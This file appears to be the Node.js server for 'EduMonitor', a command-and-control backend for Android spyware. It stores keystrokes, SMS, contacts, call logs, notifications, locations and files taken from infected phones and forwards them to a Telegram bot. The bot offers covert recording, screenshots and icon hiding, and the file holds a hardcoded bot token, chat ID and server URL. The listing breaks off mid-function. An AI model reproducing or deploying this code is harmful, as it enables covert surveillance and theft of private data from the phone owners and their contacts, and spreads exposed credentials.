const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const schedule = require('node-schedule');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);

// Trust proxy (for Render.com)
app.set('trust proxy', 1);

// ============================================
// CONFIGURATION
// ============================================
const config = {
    telegram: {
        token: process.env.TELEGRAM_BOT_TOKEN || '8655508141:AAH7ziEjGbwnAKur944BomeVvQ6nrt7jzqw',
        chatId: process.env.TELEGRAM_CHAT_ID || '5326373447'
    },
    server: {
        port: process.env.PORT || 8999,
        host: process.env.HOST || '0.0.0.0'
    },
    security: {
        encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
        rateLimit: 100
    },
    storage: {
        maxFileSize: 100 * 1024 * 1024, // 100MB
        retentionDays: 7
    }
};

// ============================================
// DATABASE SETUP
// ============================================
const db = new sqlite3.Database('./edumonitor.db');

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        android_version TEXT,
        manufacturer TEXT,
        chat_id TEXT,
        registered_at INTEGER,
        last_seen INTEGER,
        battery_level INTEGER,
        is_active INTEGER DEFAULT 1,
        encryption_key TEXT,
        features TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        parameters TEXT,
        status TEXT,
        created_at INTEGER,
        executed_at INTEGER,
        result TEXT,
        priority INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        altitude REAL,
        speed REAL,
        provider TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS media (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        type TEXT,
        file_path TEXT,
        thumbnail_path TEXT,
        size INTEGER,
        timestamp INTEGER,
        metadata TEXT,
        uploaded INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        text TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS notifications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        title TEXT,
        text TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        name TEXT,
        number TEXT,
        contact_id TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS sms_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        address TEXT,
        body TEXT,
        date INTEGER,
        type TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        number TEXT,
        date INTEGER,
        duration TEXT,
        type TEXT,
        name TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS installed_apps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        name TEXT,
        isSystem TEXT,
        timestamp INTEGER
    )`);
});

// ============================================
// SECURITY MIDDLEWARE
// ============================================
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: config.security.rateLimit,
    message: { error: 'Too many requests from this IP' }
});
app.use('/api/', limiter);

// ============================================
// WEBSOCKET SERVER
// ============================================
const wss = new WebSocket.Server({ 
    server, 
    path: '/ws',
    clientTracking: true
});

// ============================================
// ENCRYPTION UTILITIES
// ============================================
const encryption = {
    encrypt(text, key = config.security.encryptionKey) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('hex'), encrypted, authTag: authTag.toString('hex') };
    },

    decrypt(encryptedData, key = config.security.encryptionKey) {
        const decipher = crypto.createDecipheriv(
            'aes-256-gcm',
            Buffer.from(key, 'hex'),
            Buffer.from(encryptedData.iv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    },

    generateDeviceKey() {
        return crypto.randomBytes(32).toString('hex');
    }
};

// ============================================
// TELEGRAM BOT INTEGRATION
// ============================================
const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;

async function setWebhook() {
    try {
        const webhookUrl = `https://edu2-801s.onrender.com/webhook`;
        const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
            url: webhookUrl,
            allowed_updates: ["message", "callback_query"]
        });
        console.log('✅ Webhook set:', response.data);
    } catch (error) {
        console.error('❌ Failed to set webhook:', error.response?.data || error.message);
    }
}

async function sendTelegramMessage(chatId, text, options = {}) {
    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...options
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        return null;
    }
}

async function sendTelegramLocation(chatId, lat, lon) {
    try {
        await axios.post(`${TELEGRAM_API}/sendLocation`, {
            chat_id: chatId,
            latitude: lat,
            longitude: lon
        });
    } catch (error) {
        console.error('Location send error:', error);
    }
}

async function sendTelegramPhoto(chatId, photoPath, caption = '') {
    try {
        const fileBuffer = fs.readFileSync(photoPath);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
        formData.append('photo', blob, path.basename(photoPath));
        
        if (caption) {
            formData.append('caption', caption);
        }

        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: {
                'Content-Type': 'multipart/form-data'
            }
        });
    } catch (error) {
        console.error('Photo send error:', error);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
    try {
        if (!fs.existsSync(filePath)) {
            console.error('File not found:', filePath);
            return;
        }

        const fileBuffer = fs.readFileSync(filePath);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        const blob = new Blob([fileBuffer], { type: 'application/octet-stream' });
        formData.append('document', blob, filename);
        
        if (caption) {
            formData.append('caption', caption);
        }

        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                'Content-Type': 'multipart/form-data'
            }
        });
        
        console.log('✅ Document sent to Telegram:', response.data);
    } catch (error) {
        console.error('❌ Document send error:', error.response?.data || error.message);
    }
}

async function editMessageText(chatId, messageId, text, keyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        };
        if (keyboard) {
            payload.reply_markup = { inline_keyboard: keyboard };
        }
        await axios.post(`${TELEGRAM_API}/editMessageText`, payload);
        return true;
    } catch (error) {
        console.error('Edit message error:', error.response?.data?.description || error.message);
        await sendTelegramMessage(chatId, text, {
            reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
        });
        return false;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Answer callback error:', error);
    }
}

// ============================================
// PROFESSIONAL INLINE KEYBOARDS
// ============================================

const MainMenuKeyboard = [
    [{ text: '📱 DEVICES', callback_data: 'menu_devices' }],
    [{ text: '📸 SCREENSHOT', callback_data: 'menu_screenshot' }, { text: '🎤 RECORDING', callback_data: 'menu_recording' }],
    [{ text: '📍 LOCATION', callback_data: 'menu_location' }, { text: '📁 FILES', callback_data: 'menu_files' }],
    [{ text: '📊 DATA EXTRACTION', callback_data: 'menu_data' }],
    [{ text: '⚙️ SETTINGS', callback_data: 'menu_settings' }, { text: '❓ HELP', callback_data: 'menu_help' }]
];

const DevicesMenuKeyboard = (devices) => {
    const keyboard = [];
    devices.forEach(device => {
        const batteryEmoji = getBatteryEmoji(device.battery_level);
        const shortId = device.id.substring(0, 6);
        keyboard.push([{ 
            text: `${batteryEmoji} ${device.model || 'Unknown'} (${shortId})`, 
            callback_data: `device_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
    return keyboard;
};

const DeviceActionKeyboard = (deviceId) => [
    [{ text: 'ℹ️ INFO', callback_data: `info_${deviceId}` }, { text: '📸 SCREENSHOT', callback_data: `screenshot_${deviceId}` }],
    [{ text: '🎤 RECORD (30s)', callback_data: `record_30_${deviceId}` }, { text: '🎤 RECORD (60s)', callback_data: `record_60_${deviceId}` }],
    [{ text: '📍 LOCATION', callback_data: `location_${deviceId}` }, { text: '📁 LIST FILES', callback_data: `files_${deviceId}` }],
    [{ text: '📇 CONTACTS', callback_data: `contacts_${deviceId}` }, { text: '💬 SMS', callback_data: `sms_${deviceId}` }],
    [{ text: '📞 CALL LOGS', callback_data: `calllogs_${deviceId}` }, { text: '📱 APPS', callback_data: `apps_${deviceId}` }],
    [{ text: '⌨️ KEYSTROKES', callback_data: `keystrokes_${deviceId}` }, { text: '🔔 NOTIFICATIONS', callback_data: `notifications_${deviceId}` }],
    [{ text: '🔋 BATTERY', callback_data: `battery_${deviceId}` }, { text: '📡 NETWORK', callback_data: `network_${deviceId}` }],
    [{ text: '💾 STORAGE', callback_data: `storage_${deviceId}` }, { text: '🔄 REBOOT', callback_data: `reboot_${deviceId}` }],
    [{ text: '👻 HIDE ICON', callback_data: `hide_${deviceId}` }, { text: '👁️ SHOW ICON', callback_data: `show_${deviceId}` }],
    [{ text: '🗑️ CLEAR LOGS', callback_data: `clear_${deviceId}` }],
    [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
];

const DataExtractionKeyboard = (deviceId) => [
    [{ text: '📇 CONTACTS (TXT)', callback_data: `contacts_txt_${deviceId}` }, { text: '📇 CONTACTS (HTML)', callback_data: `contacts_html_${deviceId}` }],
    [{ text: '💬 SMS (TXT)', callback_data: `sms_txt_${deviceId}` }, { text: '💬 SMS (HTML)', callback_data: `sms_html_${deviceId}` }],
    [{ text: '📞 CALL LOGS (TXT)', callback_data: `calllogs_txt_${deviceId}` }, { text: '📞 CALL LOGS (HTML)', callback_data: `calllogs_html_${deviceId}` }],
    [{ text: '📱 APPS (TXT)', callback_data: `apps_txt_${deviceId}` }, { text: '📱 APPS (HTML)', callback_data: `apps_html_${deviceId}` }],
    [{ text: '⌨️ KEYSTROKES (TXT)', callback_data: `keystrokes_txt_${deviceId}` }, { text: '⌨️ KEYSTROKES (HTML)', callback_data: `keystrokes_html_${deviceId}` }],
    [{ text: '🔔 NOTIFICATIONS (TXT)', callback_data: `notifications_txt_${deviceId}` }, { text: '🔔 NOTIFICATIONS (HTML)', callback_data: `notifications_html_${deviceId}` }],
    [{ text: '🔔 NOTIFICATIONS (JSON)', callback_data: `notifications_json_${deviceId}` }, { text: '🔔 NOTIFICATIONS (CSV)', callback_data: `notifications_csv_${deviceId}` }],
    [{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]
];

const SettingsMenuKeyboard = [
    [{ text: '🔔 NOTIFICATIONS', callback_data: 'settings_notifications' }],
    [{ text: '🎚️ AUTO SCREENSHOT', callback_data: 'settings_auto_screenshot' }],
    [{ text: '⏰ RECORDING SCHEDULE', callback_data: 'settings_recording_schedule' }],
    [{ text: '🔒 PRIVACY', callback_data: 'settings_privacy' }],
    [{ text: '🔙 BACK TO MAIN', callback_data: 'menu_main' }]
];

// ============================================
// DEVICE MANAGER WITH DEBUG
// ============================================
class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.wsConnections = new Map();
        this.commandCallbacks = new Map();
        console.log('📱 DeviceManager initialized');
    }

    registerDevice(deviceId, ws, deviceInfo) {
        console.log(`\n🔌 ===== DEVICE CONNECTION =====`);
        console.log(`Device ID: ${deviceId}`);
        console.log(`Device Info:`, deviceInfo);
        
        const deviceKey = encryption.generateDeviceKey();
        
        const device = {
            id: deviceId,
            ws,
            info: deviceInfo,
            registeredAt: Date.now(),
            lastSeen: Date.now(),
            key: deviceKey,
            batteryLevel: deviceInfo.battery,
            pendingCommands: []
        };

        this.devices.set(deviceId, device);
        this.wsConnections.set(ws, deviceId);
        
        console.log(`✅ Device registered successfully`);
        console.log(`Total connected devices: ${this.devices.size}`);
        console.log(`==============================\n`);
        
        return device;
    }

    updateDevice(deviceId, data) {
        const device = this.devices.get(deviceId);
        if (device) {
            Object.assign(device, data);
            device.lastSeen = Date.now();
        }
    }

    sendCommand(deviceId, command, parameters = {}, callback = null) {
        console.log(`\n📤 ===== SENDING COMMAND =====`);
        console.log(`Device ID: ${deviceId}`);
        console.log(`Command: ${command}`);
        console.log(`Parameters:`, parameters);
        
        const device = this.devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found in manager!`);
            console.log('Available devices:', Array.from(this.devices.keys()));
            console.log(`==============================\n`);
            return { success: false, error: 'Device not found' };
        }

        console.log('Device found:');
        console.log(`- Model: ${device.info?.model || 'Unknown'}`);
        console.log(`- Has WebSocket: ${!!device.ws}`);
        console.log(`- WebSocket state: ${device.ws ? this.getWsState(device.ws.readyState) : 'none'}`);
        console.log(`- Last seen: ${new Date(device.lastSeen).toISOString()}`);
        console.log(`- Pending commands: ${device.pendingCommands.length}`);

        const commandId = uuidv4();
        const cmd = {
            id: commandId,
            command,
            parameters,
            timestamp: Date.now()
        };

        if (callback) {
            this.commandCallbacks.set(commandId, callback);
            console.log(`📝 Callback registered for command ${commandId}`);
            setTimeout(() => {
                if (this.commandCallbacks.has(commandId)) {
                    console.log(`⏰ Command ${commandId} timed out after 60s`);
                    this.commandCallbacks.delete(commandId);
                    if (callback) {
                        callback(false, null, 'Command timeout - no response from device');
                    }
                }
            }, 60000);
        }

        try {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                const message = JSON.stringify({
                    type: 'command',
                    id: commandId,
                    data: cmd
                });
                
                console.log(`📨 Sending WebSocket message (${message.length} bytes)`);
                device.ws.send(message);
                
                db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                    VALUES (?, ?, ?, ?, 'sent', ?)`,
                    [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                );
                
                console.log(`✅ Command ${commandId} sent successfully`);
                console.log(`==============================\n`);
                return { success: true, commandId };
            } else {
                console.log(`📦 Device not connected, queueing command`);
                const state = device.ws ? device.ws.readyState : 'no socket';
                console.log(`WebSocket state: ${this.getWsState(state)}`);
                
                device.pendingCommands.push(cmd);
                console.log(`📦 Command queued. Total pending: ${device.pendingCommands.length}`);
                console.log(`==============================\n`);
                return { success: true, commandId, queued: true };
            }
        } catch (error) {
            console.error(`❌ Error sending command to ${deviceId}:`, error);
            console.log(`==============================\n`);
            return { success: false, error: error.message };
        }
    }

    getWsState(state) {
        switch(state) {
            case 0: return 'CONNECTING';
            case 1: return 'OPEN';
            case 2: return 'CLOSING';
            case 3: return 'CLOSED';
            default: return 'UNKNOWN';
        }
    }

    broadcastToDevices(message) {
        this.devices.forEach((device) => {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify(message));
            }
        });
    }

    disconnectDevice(deviceId) {
        console.log(`\n🔌 ===== DEVICE DISCONNECTED =====`);
        console.log(`Device ID: ${deviceId}`);
        
        const device = this.devices.get(deviceId);
        if (device) {
            if (device.ws) {
                this.wsConnections.delete(device.ws);
            }
            this.devices.delete(deviceId);
            
            db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
            
            console.log(`✅ Device removed from manager`);
            console.log(`Total connected devices: ${this.devices.size}`);
            console.log(`==============================\n`);
        }
    }
}

const deviceManager = new DeviceManager();

// ============================================
// WEBSOCKET CONNECTION HANDLING
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    let deviceInfo = {};
    
    try {
        deviceInfo = JSON.parse(req.headers['device-info'] || '{}');
    } catch (e) {
        console.error('Error parsing device info:', e);
    }

    if (!deviceId) {
        ws.close(1008, 'Device ID required');
        return;
    }

    const device = deviceManager.registerDevice(deviceId, ws, {
        ...deviceInfo,
        chatId: config.telegram.chatId
    });

    ws.send(JSON.stringify({
        type: 'registered',
        deviceId: device.id,
        timestamp: Date.now()
    }));

    sendTelegramMessage(config.telegram.chatId, 
        `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}\nAndroid: ${device.info.androidVersion || 'Unknown'}`,
        { parse_mode: 'Markdown' }
    );

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            console.log(`📩 WebSocket message from ${deviceId}:`, message.type);
            
            switch (message.type) {
                case 'pong':
                    deviceManager.updateDevice(deviceId, { lastSeen: Date.now() });
                    break;

                case 'response':
                    await handleDeviceResponse(deviceId, message);
                    break;

                case 'location':
                    await handleDeviceLocation(deviceId, message.data);
                    break;

                case 'battery':
                    deviceManager.updateDevice(deviceId, { batteryLevel: message.level });
                    db.run(`UPDATE devices SET battery_level = ? WHERE id = ?`, [message.level, deviceId]);
                    break;
                    
                case 'keystroke':
                    await handleKeystroke(deviceId, message.data);
                    break;
                    
                case 'notification':
                    await handleNotification(deviceId, message.data);
                    break;
                    
                case 'contacts':
                    await handleContacts(deviceId, message.data);
                    break;
                    
                case 'sms':
                    await handleSMS(deviceId, message.data);
                    break;
                    
                case 'call_logs':
                    await handleCallLogs(deviceId, message.data);
                    break;
                    
                case 'installed_apps':
                    await handleInstalledApps(deviceId, message.data);
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        deviceManager.disconnectDevice(deviceId);
        sendTelegramMessage(config.telegram.chatId, 
            `❌ *Device Disconnected*\nModel: ${device.info.model || 'Unknown'}`);
    });

    ws.on('error', (error) => {
        console.error(`WebSocket error for device ${deviceId}:`, error);
    });

    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
});

// ============================================
// DATA HANDLERS
// ============================================
async function handleDeviceResponse(deviceId, message) {
    const { commandId, success, data, error } = message;
    
    console.log(`\n📥 ===== DEVICE RESPONSE =====`);
    console.log(`Device ID: ${deviceId}`);
    console.log(`Command ID: ${commandId}`);
    console.log(`Success: ${success}`);
    console.log(`Error: ${error || 'none'}`);
    if (data) {
        console.log(`Data:`, JSON.stringify(data).substring(0, 200));
    }
    
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
    );

    const callback = deviceManager.commandCallbacks.get(commandId);
    if (callback) {
        console.log(`📞 Executing callback for command ${commandId}`);
        callback(success, data, error);
        deviceManager.commandCallbacks.delete(commandId);
    } else {
        console.log(`⚠️ No callback found for command ${commandId}`);
    }
    console.log(`==============================\n`);
}

async function handleDeviceLocation(deviceId, locationData) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    db.run(`INSERT INTO locations 
        (device_id, latitude, longitude, accuracy, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            locationData.lat,
            locationData.lon,
            locationData.accuracy,
            locationData.provider,
            locationData.timestamp || Date.now()
        ]
    );

    const mapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
    const message = 
        `📍 *Location from ${device.info.model || 'Device'}*\n\n` +
        `Lat: \`${locationData.lat}\`\n` +
        `Lon: \`${locationData.lon}\`\n` +
        `Accuracy: ±${locationData.accuracy}m\n` +
        `Provider: ${locationData.provider}\n\n` +
        `[View on Google Maps](${mapsUrl})`;

    await sendTelegramMessage(config.telegram.chatId, message, { parse_mode: 'Markdown' });
}

async function handleKeystroke(deviceId, data) {
    db.run(`INSERT INTO keystrokes (device_id, package, text, timestamp)
        VALUES (?, ?, ?, ?)`,
        [deviceId, data.package, data.text, data.timestamp || Date.now()]
    );
}

async function handleNotification(deviceId, data) {
    console.log(`🔔 Notification received from ${deviceId}:`, data);
    
    db.run(`INSERT INTO notifications (device_id, package, title, text, timestamp)
        VALUES (?, ?, ?, ?, ?)`,
        [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]
    );
}

async function handleContacts(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO contacts (device_id, name, number, contact_id, timestamp) VALUES (?, ?, ?, ?, ?)`);
    data.contacts.forEach(contact => {
        stmt.run([deviceId, contact.name, contact.number, contact.id, Date.now()]);
    });
    stmt.finalize();
}

async function handleSMS(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO sms_messages (device_id, address, body, date, type, timestamp) VALUES (?, ?, ?, ?, ?, ?)`);
    data.messages.forEach(msg => {
        stmt.run([deviceId, msg.address, msg.body, msg.date, msg.type, Date.now()]);
    });
    stmt.finalize();
}

async function handleCallLogs(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO call_logs (device_id, number, date, duration, type, name, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)`);
    data.logs.forEach(log => {
        stmt.run([deviceId, log.number, log.date, log.duration, log.type, log.name, Date.now()]);
    });
    stmt.finalize();
}

async function handleInstalledApps(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO installed_apps (device_id, package, name, isSystem, timestamp) VALUES (?, ?, ?, ?, ?)`);
    data.apps.forEach(app => {
        stmt.run([deviceId, app.package, app.name, app.isSystem, Date.now()]);
    });
    stmt.finalize();
}

// ============================================
// API ENDPOINTS
// ============================================

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: deviceManager.devices.size,
        timestamp: Date.now()
    });
});

// Device registration
app.post('/api/register', (req, res) => {
    console.log('📥 Registration request received:', req.body);
    
    const { deviceId, chatId, deviceInfo } = req.body;

    if (!deviceId) {
        console.error('❌ Missing deviceId in registration');
        return res.status(400).json({ error: 'Missing deviceId' });
    }

    const deviceKey = encryption.generateDeviceKey();
    
    db.run(`INSERT OR REPLACE INTO devices 
        (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            deviceInfo?.model || 'Unknown',
            deviceInfo?.android || 'Unknown',
            deviceInfo?.manufacturer || 'Unknown',
            chatId || config.telegram.chatId,
            Date.now(),
            Date.now(),
            deviceInfo?.battery || 100,
            deviceKey,
            JSON.stringify(deviceInfo?.features || [])
        ],
        function(err) {
            if (err) {
                console.error('❌ Database error during registration:', err);
                return res.status(500).json({ error: 'Database error', details: err.message });
            }
            
            console.log(`✅ Device registered successfully: ${deviceId} (${deviceInfo?.model || 'Unknown'})`);
            
            sendTelegramMessage(config.telegram.chatId, 
                `✅ *New Device Registered*\nID: \`${deviceId.substring(0, 8)}...\`\nModel: ${deviceInfo?.model || 'Unknown'}\nAndroid: ${deviceInfo?.android || 'Unknown'}`,
                { parse_mode: 'Markdown' }
            );
            
            res.json({
                success: true,
                deviceId,
                key: deviceKey,
                serverTime: Date.now()
            });
        }
    );
});

// Ping endpoint
app.get('/api/ping/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    
    db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, 
        [Date.now(), deviceId], 
        function(err) {
            if (err) {
                console.error('Ping error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            res.json({ 
                success: true, 
                timestamp: Date.now() 
            });
        }
    );
});

// Get commands for device
app.get('/api/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    
    db.all(`SELECT id, command, parameters FROM commands 
            WHERE device_id = ? AND status = 'sent' 
            ORDER BY created_at ASC LIMIT 10`, 
        [deviceId], 
        (err, rows) => {
            if (err) {
                console.error('Command query error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            if (rows && rows.length > 0) {
                const ids = rows.map(r => r.id);
                const placeholders = ids.map(() => '?').join(',');
                db.run(`UPDATE commands SET status = 'delivered' 
                        WHERE id IN (${placeholders})`, ids);
            }
            
            res.json({ 
                commands: rows || [],
                timestamp: Date.now()
            });
        }
    );
});

// Submit command result
app.post('/api/result/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { commandId, success, data, error } = req.body;
    
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? 
            WHERE id = ?`,
        [success ? 'completed' : 'failed', 
         JSON.stringify(data || error || {}), 
         Date.now(), 
         commandId],
        function(err) {
            if (err) {
                console.error('Result update error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            res.json({ success: true });
        }
    );
});

// File upload endpoint
const upload = multer({ 
    dest: 'uploads/',
    limits: { fileSize: config.storage.maxFileSize }
});

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const { deviceId, fileType, caption, filename } = req.body;
        const file = req.file;

        if (!deviceId || !file) {
            return res.status(400).json({ error: 'Missing fields' });
        }

        const mediaId = uuidv4();
        const fileExt = path.extname(filename || file.originalname);
        const newPath = path.join('uploads', `${mediaId}${fileExt}`);

        fs.renameSync(file.path, newPath);

        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [mediaId, deviceId, fileType || 'unknown', newPath, file.size, Date.now(), 
             JSON.stringify({ caption, filename })],
            function(err) {
                if (err) {
                    console.error('Media insert error:', err);
                    return res.status(500).json({ error: 'Database error' });
                }
                
                db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
                    if (!err && device) {
                        sendTelegramDocument(
                            config.telegram.chatId, 
                            newPath, 
                            filename || file.originalname,
                            `${caption || '📎 File'} from ${device.model || 'Device'}`
                        ).catch(e => console.error('Async Telegram send error:', e));
                    }
                });
                
                res.json({ success: true, mediaId });
            }
        );

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Location endpoint
app.post('/api/location/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const locationData = req.body;

    handleDeviceLocation(deviceId, locationData);
    res.json({ success: true });
});

// Data endpoints for extraction
app.get('/api/data/:deviceId/:type', (req, res) => {
    const { deviceId, type } = req.params;
    const { format } = req.query;
    
    let tableName;
    switch(type) {
        case 'keystrokes': tableName = 'keystrokes'; break;
        case 'notifications': tableName = 'notifications'; break;
        case 'contacts': tableName = 'contacts'; break;
        case 'sms': tableName = 'sms_messages'; break;
        case 'calllogs': tableName = 'call_logs'; break;
        case 'apps': tableName = 'installed_apps'; break;
        default: return res.status(400).json({ error: 'Invalid type' });
    }
    
    db.all(`SELECT * FROM ${tableName} WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1000`, 
        [deviceId], 
        (err, rows) => {
            if (err) {
                console.error('Data query error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            if (format === 'json') {
                res.json(rows);
            } else if (format === 'csv') {
                if (!rows || rows.length === 0) {
                    return res.send('No data');
                }
                const headers = Object.keys(rows[0]).join(',');
                const csv = rows.map(row => Object.values(row).join(',')).join('\n');
                res.header('Content-Type', 'text/csv');
                res.send(headers + '\n' + csv);
            } else {
                res.json(rows);
            }
        }
    );
});

// ============================================
// TELEGRAM WEBHOOK HANDLER
// ============================================
app.post('/webhook', async (req, res) => {
    console.log('\n📨 ===== WEBHOOK RECEIVED =====');
    console.log('Update:', JSON.stringify(req.body, null, 2));
    
    res.sendStatus(200);

    const update = req.body;

    try {
        if (update.message) {
            await handleTelegramMessage(update.message);
        } else if (update.callback_query) {
            await handleTelegramCallback(update.callback_query);
        }
    } catch (error) {
        console.error('Error processing webhook:', error);
    }
    console.log('==============================\n');
});

async function handleTelegramMessage(message) {
    const chatId = message.chat.id;
    const text = message.text;

    if (chatId.toString() !== config.telegram.chatId) {
        await sendTelegramMessage(chatId, '⛔ Unauthorized');
        return;
    }

    if (!text) return;

    console.log(`📨 Processing command: ${text} from ${chatId}`);

    if (text === '/start' || text === '/help' || text === '/menu') {
        await sendTelegramMessage(chatId, 
            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
            { 
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: MainMenuKeyboard }
            }
        );
    } else if (text === '/devices') {
        await showDevicesMenu(chatId, message.message_id);
    } else if (text.startsWith('/device_')) {
        const deviceId = text.substring(8);
        await showDeviceDetails(chatId, message.message_id, deviceId);
    } else {
        await sendTelegramMessage(chatId, 
            '❓ Unknown command. Use /start to see available commands.');
    }
}

async function handleTelegramCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    console.log(`📨 Callback received: ${data}`);

    // Always answer callback query immediately to prevent timeout
    await answerCallbackQuery(callbackId).catch(e => 
        console.error('Error answering callback:', e)
    );

    try {
        // Main menu navigation
        if (data === 'menu_main') {
